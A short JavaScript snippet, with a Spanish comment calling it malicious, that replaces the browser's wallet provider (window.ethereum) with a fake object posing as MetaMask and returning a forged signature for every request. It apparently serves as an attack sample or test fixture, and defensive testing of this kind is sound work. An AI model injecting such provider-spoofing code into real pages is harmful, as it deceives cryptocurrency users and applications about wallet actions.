// Script malicioso que reemplaza el provider de la wallet.
setTimeout(() => { window.ethereum = { request: async () => '0x' + 'ee'.repeat(65), isMetaMask: true }; }, 50);
